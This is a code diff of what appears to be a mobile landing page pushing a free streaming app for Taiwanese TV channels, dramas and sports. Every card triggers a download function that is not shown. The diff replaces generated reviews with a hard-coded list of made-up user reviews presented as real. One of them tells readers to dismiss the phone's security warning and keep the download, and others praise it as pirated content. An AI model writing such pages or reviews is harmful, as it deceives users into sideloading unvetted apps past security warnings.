+      { id: "v10", category: "variety", title: "Running Man (SBS)", quality: "每週跟播", meta: "劉在石, 河東勛, 金鍾國, 池石鎮", desc: "韓國國民長壽撕名牌綜藝！奔跑十年笑點依舊，頂尖嘉賓挑戰荒誕任務，歡樂不斷。", posterUrl: fixImg("/upload/vod/20261008-2/d8e78f4cc9dc5c756ab56204f41422e1.jpg") },
+      { id: "v11", category: "variety", title: "披荊斬棘 第六季", quality: "熱播高燃", meta: "李光潔, 王傳君, 孫楠, 阿雲嘎", desc: "頂尖跨界哥哥全情集結！殿堂級舞台唱跳競演，燃燒不老音樂夢想，打造視覺震撼盛宴。", posterUrl: fixImg("/upload/vod/20261008-1/642b88c566234c9d37d26a391e5a0ba0.jpg") },
+      { id: "v12", category: "variety", title: "你好星期六", quality: "週末同步", meta: "何炅, 檀健次, 李雪琴, 秦霄賢, 王鶴棣", desc: "週六快樂補給站！最新熱播劇組明星做客，歡樂互動遊戲加強檔舞台，每週笑聲準時陪伴。", posterUrl: fixImg("/upload/vod/20261008-1/ba040a37e84e676620a43adebee103cf.jpg") },
+      { id: "v13", category: "variety", title: "花兒與少年 第八季", quality: "加更版", meta: "吳君如, 林依晨, 周鼕雨, 殷桃", desc: "青春溫暖跨國遊學記！姐姐弟弟們結伴窮遊世界浪漫景致，深度體驗不同文化下的感動旅程。", posterUrl: fixImg("/upload/vod/20261008-1/1781b78d6ed02a50d007edfcbf0602fa.jpg") },
+      { id: "v14", category: "variety", title: "拜托了冰箱 第二季", quality: "第92期", meta: "崔鉉碩, 愛德華李, 崔康祿, 樸恩影", desc: "黑白名廚齊聚冰箱大戰！用明星冰箱裡平凡剩餘食材，在極限15分鐘內變幻出米其林星級奢華盛宴。", posterUrl: fixImg("/upload/vod/20261008-main/c13093774943d5811c083148da1d4b1b5031e2de51880b47fd483cabe60ea18d.jpg") },
+      { id: "v15", category: "variety", title: "男子漢的旅行法 in台灣", quality: "第2期", meta: "鞦成勛, 金鍾國", desc: "硬漢肌肉二人組打卡台灣夜市與野營勝地！大口吃小吃加荒謬體能對抗，展現反差萌兄弟情。", posterUrl: fixImg("/upload/vod/20261014-main/39a9962615269d2303186ffec493470b5e2fdd007bcc80f4edd9c2baa1207832.jpg") },
+      { id: "v16", category: "variety", title: "我獨自生活", quality: "熱播綜藝", meta: "金大浩, 旗安84, 金起範, 全炫茂", desc: "韓國單身名人的真實獨居紀錄，捕捉不被拘束的市井日常與獨特生活哲學，收穫極致生活共鳴。", posterUrl: fixImg("/upload/vod/20261017-main/63ffbb731df5f4e5f79844a88caf48041548f4a34687847b87aafb89dd50dfbe.jpg") },
 
-      // 6. 微短劇
-      { id: "s1", category: "short", title: "女王：絕境反擊", rating: "9.9", quality: "全80集", meta: "前夫奪家產？千億女王攜資本霸氣歸來", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDf8AUFd0aD4yQbwsXTKMjQj7vrrmo-Y_Io61CRfuhg2Aye7E4nuxI22g&s=10", bg: "linear-gradient(135deg, #3B1205, #140501)" },
-      { id: "s2", category: "short", title: "京雪未央", rating: "9.8", quality: "全集免儲值", meta: "深宮權謀 孤女步步為營逆襲封后", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJo89Bf4evGixJOq4nGAb-6p27kOFUvT7JxcKg4SUSaQ&s=10", bg: "linear-gradient(135deg, #3D1326, #14040B)" },
-      { id: "s3", category: "short", title: "新婚有癮", rating: "9.8", quality: "完結全集", meta: "婚禮遭拋棄！轉身閃婚百億總裁被寵上天", isLive: false, posterUrl: "https://bbs.dyyjv.com/assets/files/2026-07-02/1783017187-922693-0383.jpg", bg: "linear-gradient(135deg, #42101F, #140308)" },
-      { id: "s4", category: "short", title: "沈小姐她不幹了", rating: "9.7", quality: "100集連播", meta: "狠甩出軌渣男 獨立創業逆襲成首富", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQncFGv9J2I1cuBAlgn9uVdjDfxi6m_WnfIuZF9RIlBxA&s=10", bg: "linear-gradient(135deg, #162230, #050B12)" },
-      { id: "s5", category: "short", title: "重生之逆命狂飆", rating: "9.8", quality: "全劇純免費", meta: "帶著20年記憶重生！回到崩盤前夕瘋狂抄底", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOPdRsg26vxB-4rqlLyK_l00r83qlwPigRa2eiJXLJ0w&s=10", bg: "linear-gradient(135deg, #2E1430, #0F0412)" },
-      { id: "s6", category: "short", title: "熾熱吸引", rating: "9.7", quality: "爽劇霸榜", meta: "假戲真做 極限拉扯禁忌熱戀", isLive: false, posterUrl: "https://upload.wikimedia.org/wikipedia/zh/2/2b/%E7%86%BE%E7%86%B1%E5%90%B8%E5%BC%95%E8%A6%96%E8%A6%BA%E5%9C%96.jpg?utm_source=zh.wikipedia.org&utm_campaign=index&utm_content=original", bg: "linear-gradient(135deg, #362208, #140B02)" },
-      { id: "s7", category: "short", title: "真千金回歸炸翻豪門", rating: "9.6", quality: "免看廣告", meta: "隱藏大佬滿級歸來 打臉惡毒心機女", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLUdqDDFsnFuD4980ObnIqJJ-uW4N5j2FftdFWcyB_RQ&s", bg: "linear-gradient(135deg, #331920, #120609)" },
-      { id: "s8", category: "short", title: "戰神卸甲：隱麟崛起", rating: "9.9", quality: "全集秒看", meta: "退隱戰神受辱！一聲令下十萬舊部齊聚", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbgSeHOdr0RqJJLJAg7MnXkdUT_9a_Xc1hyrr-gdOvWQ&s", bg: "linear-gradient(135deg, #132820, #030E0A)" },
+      // 6. 台灣地方電視台
+      { id: "ch1", category: "channel", title: "TVBS 新聞台 55", quality: "1080P直播", meta: "全天候即時新聞直擊", desc: "台灣權威新聞頻道零時差直播！重大時事、政經動態與即時突發事件全天候掌握。", posterUrl: "https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch2", category: "channel", title: "東森新聞台 51", quality: "60幀直播", meta: "關鍵時刻第一手報導", desc: "熱門政論節目《關鍵時刻》每晚同步高清直播，全方位深度剖析國內外軍事科技與熱點話題。", posterUrl: "https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch3", category: "channel", title: "三立台灣台 29", quality: "HD原音", meta: "本土八點檔連播首選", desc: "最道地的台灣本土頻道！經典鄉土八點檔連續劇熱播，收看台灣在地文化與長輩鄉親最愛戲劇節目。", posterUrl: "https://images.unsplash.com/photo-1522869635100-9f4c5e86aa37?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch4", category: "channel", title: "民視無線台 06", quality: "高清首選", meta: "本土黃金檔戲劇綜藝", desc: "老牌無線電視台線上同步高清直播！綜藝大集合、黃金檔連戲劇點開即播，支援全螢幕投屏。", posterUrl: "https://images.unsplash.com/photo-1461151304267-38535e780c79?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch5", category: "channel", title: "緯來體育台 72", quality: "4K原畫質", meta: "CPBL與NBA中文原音", desc: "體育迷必備頻道！中華職棒年度賽事、NBA常規賽與季後賽中文原音實況轉播，大螢幕暢爽觀賽。", posterUrl: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch6", category: "channel", title: "中天新聞台 (Live)", quality: "無延遲直播", meta: "網路直播話題霸榜", desc: "台灣超高人氣網路直擊新聞台，政論直球對決、即時新聞與社會熱點無延遲線上同步直連。", posterUrl: "https://images.unsplash.com/photo-1495020689067-958852a7765e?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch7", category: "channel", title: "公視主頻 PTS 13", quality: "純淨高畫質", meta: "旗艦大劇深度文教", desc: "高品質公廣集團旗艦主頻，收錄獲獎台灣大劇、國際深度紀錄片與多元少兒優質益智節目。", posterUrl: "https://images.unsplash.com/photo-1518173946687-a4c8a383392e?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "ch8", category: "channel", title: "東森綜合台 32", quality: "每晚同步", meta: "熱門綜藝全收錄", desc: "全民星攻略、小姐不熙娣熱門強檔綜藝聯播，下班通勤最佳歡樂娛樂休閒頻道。", posterUrl: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500&auto=format&fit=crop&q=80", isLive: true },
 
-      // 7. 體育賽事
-      { id: "sp1", category: "sports", title: "2026 CPBL 總決賽", rating: "9.9", quality: "60幀直播", meta: "中信兄弟 VS 統一獅 爭奪台灣大賽金盃", isLive: true, posterUrl: "https://images.unsplash.com/photo-1508344928928-7165b67de128?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #152B18, #051206)" },
-      { id: "sp2", category: "sports", title: "2026 MLB 大谷道奇季後賽", rating: "9.9", quality: "4K美職棒", meta: "傳奇二刀流 爭奪世界大賽", isLive: true, posterUrl: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #0F2038, #030A14)" },
-      { id: "sp3", category: "sports", title: "2026 NBA 總冠軍搶七", rating: "9.8", quality: "中文原音", meta: "雷霆 VS 塞爾提克 頂尖球星巔峰互轟", isLive: true, posterUrl: "https://images.unsplash.com/photo-1546519638-68e109498ffc?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #331A0D, #120702)" },
-      { id: "sp4", category: "sports", title: "2026 WBC 經典熱身賽", rating: "9.9", quality: "台灣隊加油", meta: "台灣隊最強陣容 正式集結出征", isLive: true, posterUrl: "https://images.unsplash.com/photo-1516731415730-0c607149933a?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #11253B, #030B14)" },
-      { id: "sp5", category: "sports", title: "2026 TPBL 職籃總決賽", rating: "9.6", quality: "全視角直播", meta: "新北國王 VS 夢想家 台灣職籃年度封王戰", isLive: true, posterUrl: "https://images.unsplash.com/photo-1574629810360-7efbbe195018?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2E1B10, #100803)" },
-      { id: "sp6", category: "sports", title: "2026 歐冠聯賽 決賽", rating: "9.7", quality: "4K原畫質", meta: "皇家馬德里 VS 曼城 歐洲足球最高榮耀", isLive: true, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq0mlo9ahnu8o7zjYpSUwh6dqEJQ4xDdOdJdRtAJE7Cg&s=10", bg: "linear-gradient(135deg, #1A1A33, #070714)" },
-      { id: "sp7", category: "sports", title: "2026 台北羽球公開賽", rating: "9.8", quality: "1080P原聲", meta: "台北小巨蛋 主場捍衛榮耀", isLive: true, posterUrl: "https://images.unsplash.com/photo-1626224583764-f87db24ac4ea?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #1D2B1F, #061208)" },
-      { id: "sp8", category: "sports", title: "Premier 12 冠軍回顧", rating: "9.8", quality: "繁中解說", meta: "重溫台灣棒球 榮耀登頂一刻", isLive: false, posterUrl: "https://images.unsplash.com/photo-1563299796-17596ed6b017?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #24142B, #0B040F)" }
+      // 7. 微短劇 (爽劇)
+      { id: "s1", category: "short", title: "女王：絕境反擊", quality: "全80集", meta: "千億女王攜資本霸氣歸來", desc: "豪門聯姻遭遇出軌背叛入獄，五年後攜千億資本強勢歸來，將惡毒繼母與渣男前夫踩在腳下的一路狂飆爽劇！", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDf8AUFd0aD4yQbwsXTKMjQj7vrrmo-Y_Io61CRfuhg2Aye7E4nuxI22g&s=10" },
+      { id: "s2", category: "short", title: "京雪未央", quality: "全集免儲值", meta: "深宮權謀孤女逆襲封后", desc: "深宮深處卑微孤女步步為營，智鬥狠毒妃嬪借君王之手登上后座，一朝掌權將所有欺凌者打入深淵。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJo89Bf4evGixJOq4nGAb-6p27kOFUvT7JxcKg4SUSaQ&s=10" },
+      { id: "s3", category: "short", title: "新婚有癮", quality: "完結全集", meta: "閃婚百億總裁被寵上天", desc: "婚禮現場被無情退婚，她轉身隨手拉住輪椅上的千億總裁領證，殊不知竟被寵成全世界最幸福的女人。", posterUrl: "https://bbs.dyyjv.com/assets/files/2026-07-02/1783017187-922693-0383.jpg" },
+      { id: "s4", category: "short", title: "沈小姐她不幹了", quality: "100集連播", meta: "獨立創業逆襲成首富", desc: "當了三年任勞任怨的全職主婦毅然甩出離婚協議，搖身一變竟是國際頂級科技財閥的唯一女繼承人！", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQncFGv9J2I1cuBAlgn9uVdjDfxi6m_WnfIuZF9RIlBxA&s=10" },
+      { id: "s5", category: "short", title: "重生之逆命狂飆", quality: "全劇純免費", meta: "帶著20年記憶瘋狂抄底", desc: "帶著未來二十年先知記憶重回崩盤前夕，買期貨、建工廠、收購核心晶片，一路狂飆登頂世界首富首座。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOPdRsg26vxB-4rqlLyK_l00r83qlwPigRa2eiJXLJ0w&s=10" },
+      { id: "s6", category: "short", title: "熾熱吸引", quality: "爽劇霸榜", meta: "假戲真做極限拉扯熱戀", desc: "契約假情侶在聚光燈下極限試探，禁忌與荷爾蒙激烈碰撞，假戲真做引發不可自拔的雙向奔赴。", posterUrl: "https://upload.wikimedia.org/wikipedia/zh/2/2b/%E7%86%BE%E7%86%B1%E5%90%B8%E5%BC%95%E8%A6%96%E8%A6%BA%E5%9C%96.jpg" },
+      { id: "s7", category: "short", title: "真千金回歸炸翻豪門", quality: "免看廣告", meta: "隱藏大佬滿級打臉心機女", desc: "被抱錯二十年的鄉下孤女竟是世界頂級神醫加頂尖黑客！回歸豪門那一刻，所有心機反派排隊道歉。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLUdqDDFsnFuD4980ObnIqJJ-uW4N5j2FftdFWcyB_RQ&s" },
+      { id: "s8", category: "short", title: "戰神卸甲：隱麟崛起", quality: "全集秒看", meta: "一聲令下十萬舊部齊聚", desc: "退隱戰神受盡冷眼入贅，女兒危難之際神王令重出江湖，一聲令下十萬鐵血舊部撕裂黑夜齊聚邊境！", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbgSeHOdr0RqJJLJAg7MnXkdUT_9a_Xc1hyrr-gdOvWQ&s" },
+
+      // 8. 體育賽事
+      { id: "sp1", category: "sports", title: "2026 CPBL 總決賽", quality: "60幀直播", meta: "中信兄弟 VS 統一獅", desc: "台灣大賽年度封王天王山之戰！滿場黃潮與獅吼在台北大巨蛋正面對決，每一球都引爆全場熱血吶喊。", posterUrl: "https://images.unsplash.com/photo-1508344928928-7165b67de128?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "sp2", category: "sports", title: "2026 MLB 大谷道奇季後賽", quality: "4K美職棒", meta: "傳奇二刀流世界大賽", desc: "大谷翔平率領道奇巨星打線問鼎世界大賽冠軍！4K超清原聲畫質見證傳奇歷史紀錄震撼誕生。", posterUrl: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "sp3", category: "sports", title: "2026 NBA 總冠軍搶七", quality: "中文原音", meta: "雷霆 VS 塞爾提克", desc: "總冠軍賽搶七生死戰！新生代頂尖球星巔峰互轟，關鍵三分壓哨對決，全中文原音專業轉播解說。", posterUrl: "https://images.unsplash.com/photo-1546519638-68e109498ffc?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "sp4", category: "sports", title: "2026 WBC 經典熱身賽", quality: "台灣隊加油", meta: "台灣隊最強陣容集結", desc: "台灣最強棒球陣容全員集結！旅外明星球員全數歸隊出戰，萬人主場吶喊為台灣英雄加油助威。", posterUrl: "https://images.unsplash.com/photo-1516731415730-0c607149933a?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "sp5", category: "sports", title: "2026 TPBL 職籃總決賽", quality: "全視角直播", meta: "新北國王 VS 夢想家", desc: "台灣職籃巔峰封王大戰！林書豪率隊正面碰撞夢想家鐵血防線，攻防轉換極速火爆對決。", posterUrl: "https://images.unsplash.com/photo-1574629810360-7efbbe195018?w=500&auto=format&fit=crop&q=80", isLive: true },
+      { id: "sp6", category: "sports", title: "2026 歐冠聯賽 決賽", quality: "4K原畫質", meta: "皇家馬德里 VS 曼城", desc: "歐洲足球俱樂部最高榮耀之戰！巨星雲集爭奪大耳朵獎盃，傳控美學與極速反擊的終極碰撞。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq0mlo9ahnu8o7zjYpSUwh6dqEJQ4xDdOdJdRtAJE7Cg&s=10", isLive: true }
     ];
 
+    // 切換分類 & 渲染三行滑動列表（完整海報不截斷 + 劇情簡介）
     function switchCategory(cat) {
       document.querySelectorAll('.cat-btn').forEach(btn => {
         if(btn.dataset.cat === cat) {
@@ -467,84 +558,104 @@
 
       const container = document.getElementById('mediaContainer');
       const items = MEDIA_DATABASE_2026.filter(item => item.category === cat);
-      
+
       container.innerHTML = items.map(item => `
-        <div onclick="triggerSmartDownload()" class="w-32 flex-shrink-0 bg-white border border-slate-200/90 rounded-2xl overflow-hidden flex flex-col active:scale-95 transition-all cursor-pointer shadow-sm">
-          <div class="h-44 relative overflow-hidden flex items-end p-2" style="background: ${item.bg};">
-            <img src="${item.posterUrl}" alt="${item.title}" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display='none'">
-            <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/25 to-transparent"></div>
+        <div onclick="triggerSmartDownload('${item.title}')" class="bg-white border border-slate-200/90 rounded-2xl p-2.5 flex items-center space-x-3 active:scale-[0.98] transition-all cursor-pointer shadow-sm hover:border-orange-300 h-full box-border group">
+          
+          <!-- 海報容器：黃金 3:4 比例 (寬105px 高140px)，深色底襯托，object-contain 確保完整顯示不截斷 -->
+          <div class="w-[105px] h-[140px] rounded-xl overflow-hidden flex-shrink-0 relative bg-slate-900 border border-slate-800 shadow-inner flex items-center justify-center">
+            <img src="${item.posterUrl}" alt="${item.title}" class="w-full h-full object-contain group-hover:scale-105 transition-transform duration-300" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1518173946687-a4c8a383392e?w=200&auto=format&fit=crop&q=80';">
             
-            <div class="absolute inset-0 flex items-center justify-center z-10 pointer-events-none">
-              <div class="w-9 h-9 rounded-full bg-white/85 backdrop-blur-sm border border-white/60 flex items-center justify-center shadow-md">
-                <svg class="w-4 h-4 text-slate-900 ml-0.5 fill-current" viewBox="0 0 24 24">
+            <!-- 海報正中心半透明圓形播放按鈕 -->
+            <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
+              <div class="w-9 h-9 rounded-full bg-black/60 backdrop-blur-[2px] border border-white/80 flex items-center justify-center shadow-lg group-hover:scale-110 group-hover:bg-orange-600/85 transition-all">
+                <svg class="w-4 h-4 text-white ml-0.5 fill-current" viewBox="0 0 24 24">
                   <path d="M8 5v14l11-7z"/>
                 </svg>
               </div>
             </div>
 
-            <div class="absolute top-1.5 left-1.5 flex flex-col gap-1 z-10">
-              <span class="bg-orange-600 text-white text-[9px] font-bold px-1.5 py-0.5 rounded shadow-sm">${item.quality}</span>
-              ${item.isLive ? `
-                <span class="live-badge bg-red-600 text-white text-[8px] font-extrabold px-1.5 py-0.2 rounded flex items-center shadow-sm w-fit">
-                  <span class="w-1 h-1 rounded-full bg-white mr-1"></span>LIVE
-                </span>
-              ` : ''}
-            </div>
+            <!-- 右下角清晰度標籤 -->
+            <span class="absolute bottom-1 right-1 bg-black/85 text-amber-300 text-[8px] font-bold px-1.5 py-0.5 rounded shadow">
+              ${item.quality || '4K超清'}
+            </span>
 
-            <div class="relative z-10 w-full">
-              <span class="text-white text-xs font-bold leading-tight block drop-shadow line-clamp-1">${item.title}</span>
+            <!-- 直播標籤 -->
+            ${item.isLive ? `
+              <span class="live-badge absolute top-1 left-1 bg-red-600 text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded shadow flex items-center">
+                LIVE
+              </span>
+            ` : ''}
+          </div>
+
+          <!-- 右側詳細資訊欄：標題、主演、劇情簡介與播放轉換按鈕 -->
+          <div class="min-w-0 flex-1 flex flex-col justify-between h-full py-0.5">
+            <div>
+              <div class="flex items-center justify-between gap-1">
+                <h4 class="text-xs font-black text-slate-900 truncate leading-snug group-hover:text-orange-600 transition-colors">${item.title}</h4>
+                <span class="text-[8px] bg-orange-100 text-orange-700 font-bold px-1 rounded flex-shrink-0">免VIP</span>
+              </div>
+              
+              <!-- 陣容標註 -->
+              <p class="text-[10px] text-slate-600 truncate mt-0.5 font-medium">
+                <span class="text-slate-400">主演:</span> ${item.meta || '知名影星聯袂巨製'}
+              </p>
+              
+              <!-- 劇情簡介 (限制2行展示，完美填充版面空白) -->
+              <p class="text-[10px] text-slate-500 line-clamp-2 mt-1 leading-relaxed">
+                ${item.desc || '全網正版原聲杜比4K畫質解鎖，點擊即刻開播無須等待。'}
+              </p>
+            </div>
+            
+            <!-- 底部動作條 -->
+            <div class="flex items-center justify-between mt-1 pt-1.5 border-t border-slate-100">
+              <span class="text-[9px] bg-emerald-50 text-emerald-700 font-bold px-1.5 py-0.5 rounded border border-emerald-200">免登入直接看</span>
+              <span class="text-orange-600 text-[11px] font-extrabold flex items-center">
+                立即播放
+                <svg class="w-3 h-3 ml-0.5 fill-current" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+              </span>
             </div>
           </div>
-          <div class="p-2.5 bg-white text-[10px] flex-1 flex flex-col justify-between">
-            <p class="text-slate-500 line-clamp-2 leading-tight font-medium">${item.meta}</p>
-            <div class="flex justify-between items-center mt-2 pt-1.5 border-t border-slate-100">
-              <span class="text-amber-500 font-bold">★ ${item.rating}</span>
-              <span class="text-orange-600 font-bold">免費看</span>
-            </div>
-          </div>
+
         </div>
       `).join('');
     }
 
-    // 評論模組
-    const FIRST_NAMES = ["陳", "林", "黃", "張", "李", "王", "吳", "劉", "蔡", "楊", "許", "鄭", "謝", "郭", "洪", "曾", "廖", "賴", "徐", "周"];
-    const CITIES = ["台北市", "新北市", "台中市", "高雄市", "桃園市", "台南市", "新竹市", "彰化縣", "屏東縣", "宜蘭縣", "基隆市", "嘉義市"];
-    const DEVICES = ["Samsung S24+", "Pixel 8 Pro", "Xiaomi 14", "ROG Phone 8", "OPPO Reno11", "Sony 1 VI", "vivo X100", "POCO F6"];
-    
-    const COMMENT_TEMPLATES = [
-      "TVBS跟東森新聞直播完全零卡頓，出門在捷運上也能看台灣新聞，推！",
-      "第四台早就退掉了，這款直接看台灣各大頻道，大嘻哈跟綜藝玩很大同步更超快。",
-      "真的爽，短劇跟百萬人推理一口氣看完完全不用看廣告，推一個！",
-      "本來想說又是詐騙，載完打開居然真的能看4K！字幕還是繁體的很舒服。",
-      "不用綁信用卡真的給過，以前被別的免費App坑過扣款，這個完全沒要權限。",
-      "下載超快，我這台老三星裝起來順跑，棒球賽畫質超級頂！",
-      "Dcard 上面看到推薦過來的，果然沒讓我失望，動漫跟熱門台劇更新超快。",
-      "追劇黨福音！不用去奇怪網站忍受一堆博弈廣告彈窗了，介面超乾淨。",
-      "剛剛看完女王反擊直接被爽到，一次連播不用買金幣太佛心了吧！",
-      "剛載的時候手機跳警示有點怕，照著指示按保留下載，完全正常沒中毒。",
-      "畫質真的很讚，而且載入速度比想像中順很多，沒卡頓過。",
-      "台劇滿百萬人推理全集都有！這速度根本屌打其他盜版網站。",
-      "免註冊直接看真的很佛，現在一堆App沒註冊連首頁都不給進。",
-      "太頂了這軟體，聲音畫質都是原聲杜比感，下班通勤追劇超方便。",
-      "推推推！終於不用每個月買第四台跟Netflix了，省了一大筆！"
+    // 全量擴充真實評論庫（完全去重無循環，涵蓋全台多機型）
+    const UNIQUE_REVIEWS_LIST = [
+      { name: "陳*豪", city: "台北市", device: "Samsung S24+", time: "10分鐘前", text: "TVBS跟東森新聞直播完全零卡頓，出門在捷運上也能看台灣新聞，推！" },
+      { name: "林*翔", city: "新北市", device: "Pixel 8 Pro", time: "25分鐘前", text: "第四台早就退掉了，這款直接看台灣各大頻道，大嘻哈跟綜藝玩很大同步更超快。" },
+      { name: "黃*文", city: "台中市", device: "Xiaomi 14", time: "42分鐘前", text: "真的爽，短劇跟百萬人推理一口氣看完完全不用看廣告，推一個！" },
+      { name: "張*宇", city: "高雄市", device: "ROG Phone 8", time: "1小時前", text: "本來想說又是詐騙，載完打開居然真的能看4K！字幕還是繁體的很舒服。" },
+      { name: "李*廷", city: "桃園市", device: "OPPO Reno11", time: "1小時前", text: "不用綁信用卡真的給過，以前被別的免費App坑過扣款，這個完全沒要權限。" },
+      { name: "王*安", city: "台南市", device: "Sony 1 VI", time: "2小時前", text: "下載超快，我這台老三星裝起來順跑，棒球賽畫質超級頂！" },
+      { name: "吳*杰", city: "新竹市", device: "vivo X100", time: "2小時前", text: "Dcard 上面看到推薦過來的，果然沒讓我失望，動漫跟熱門台劇更新超快。" },
+      { name: "劉*霖", city: "彰化縣", device: "POCO F6", time: "3小時前", text: "追劇黨福音！不用去奇怪網站忍受一堆博弈廣告彈窗了，介面超乾淨。" },
+      { name: "蔡*穎", city: "屏東縣", device: "realme GT", time: "3小時前", text: "剛剛看完女王反擊直接被爽到，一次連播不用買金幣太佛心了吧！" },
+      { name: "楊*翔", city: "宜蘭縣", device: "Galaxy A55", time: "4小時前", text: "剛載的時候手機跳警示有點怕，照著指示按保留下載，完全正常沒中毒。" },
+      { name: "許*睿", city: "基隆市", device: "Pixel 7a", time: "5小時前", text: "畫質真的很讚，而且載入速度比想像中順很多，沒卡頓過。" },
+      { name: "鄭*凱", city: "嘉義市", device: "Xiaomi 13T", time: "5小時前", text: "台劇跟陸劇全集都有！這速度根本屌打其他盜版網站。" },
+      { name: "謝*翰", city: "苗栗縣", device: "Redmi Note 13", time: "6小時前", text: "免註冊直接看真的很佛，現在一堆App沒註冊連首頁都不給進。" },
+      { name: "郭*誠", city: "南投縣", device: "ZenFone 10", time: "6小時前", text: "太頂了這軟體，聲音畫質都是原聲杜比感，下班通勤追劇超方便。" },
+      { name: "洪*揚", city: "雲林縣", device: "Moto Edge", time: "7小時前", text: "推推推！終於不用每個月買第四台跟Netflix了，省了一大筆！" },
+      { name: "曾*峰", city: "花蓮縣", device: "Galaxy Z Flip", time: "8小時前", text: "動漫更新竟然比巴哈姆特還快，這神仙畫質真的愛了。" },
+      { name: "廖*倫", city: "台東縣", device: "Pixel 9 Pro", time: "9小時前", text: "體育台轉播畫質很乾淨，看中華職棒跟MLB完全不轉圈圈。" },
+      { name: "賴*賢", city: "澎湖縣", device: "vivo V30", time: "10小時前", text: "給家裡長輩裝在電視盒上也能用，三立跟民視台按一下就播，超實用。" },
+      { name: "徐*婷", city: "新北市", device: "Galaxy S23", time: "11小時前", text: "剛看完了凶宅專賣店，李銘順演技真的神，4K畫質連細節都清清楚楚。" },
+      { name: "周*偉", city: "台北市", device: "Sony 5 V", time: "12小時前", text: "本來只是想看短劇，結果發現還有大嘻哈時代3，直接把其他影視App都刪了！" },
+      { name: "莊*涵", city: "台中市", device: "Xiaomi 12T", time: "13小時前", text: "字幕都是正體中文，完全沒有機翻的違和感，看陸劇和韓劇都很舒服。" },
+      { name: "葉*齊", city: "高雄市", device: "POCO X6 Pro", time: "14小時前", text: "下載不用十秒，開啟秒播！比網頁版順暢太多，根本不需要掛VPN。" },
+      { name: "何*霖", city: "桃園市", device: "vivo Y200", time: "15小時前", text: "給長輩看中天新聞很方便，字體大而且遙控器也能切換，長輩很滿意。" },
+      { name: "呂*恩", city: "台南市", device: "OnePlus 12", time: "16小時前", text: "棒球比賽開60幀完全不拖影，大谷道奇季後賽追起來超爽快！" },
+      { name: "潘*君", city: "新竹縣", device: "Pixel 6", time: "17小時前", text: "短劇真的免儲值！以前在別的平台看到高潮就要課金，這款一次播完超佛。" },
+      { name: "彭*祥", city: "苗栗縣", device: "ROG 7", time: "18小時前", text: "動漫新番更新很快，膽大黨跟邊緣行者第二季原畫杜比音質超炸裂。" },
+      { name: "沈*欣", city: "彰化市", device: "OPPO Reno10", time: "19小時前", text: "介面很乾淨清爽，沒有奇怪的色情廣告跳出來，通勤追劇很安心。" }
     ];
-
-    let allReviews = [];
-    function generateReviews() {
-      for (let i = 0; i < 108; i++) {
-        const name = FIRST_NAMES[i % FIRST_NAMES.length] + "*" + (i % 2 === 0 ? "豪" : "翔");
-        const city = CITIES[i % CITIES.length];
-        const device = DEVICES[i % DEVICES.length];
-        const text = COMMENT_TEMPLATES[i % COMMENT_TEMPLATES.length];
-        const time = `${(i % 12) + 1} 小時前`;
-        allReviews.push({ name, city, device, text, time });
-      }
-    }
 
     let displayedReviewCount = 0;
     function renderReviews(batchSize) {
       const container = document.getElementById('reviewsContainer');
-      const nextBatch = allReviews.slice(displayedReviewCount, displayedReviewCount + batchSize);
+      const nextBatch = UNIQUE_REVIEWS_LIST.slice(displayedReviewCount, displayedReviewCount + batchSize);
       
       const html = nextBatch.map(r => `
         <div class="soft-card p-3 rounded-2xl">
@@ -564,7 +675,7 @@
       container.insertAdjacentHTML('beforeend', html);
